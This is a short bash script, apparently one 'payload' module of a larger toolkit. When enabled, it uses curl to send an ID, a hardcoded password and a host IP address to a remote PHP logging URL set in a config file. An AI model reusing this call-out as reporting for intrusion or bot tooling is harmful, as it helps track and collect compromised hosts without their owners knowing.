#!/bin/bash

source config

if [ "$PAYLOAD_PHPLOG" = "yes" ] && [ "$1" = "true" ]; then
  echo "RUNNING PAYLOAD_PHPLOG"
  curl $CURL_OPTS "$PAYLOAD_PHPLOG_url?password=password&id=$ID&ip=$2"
fi

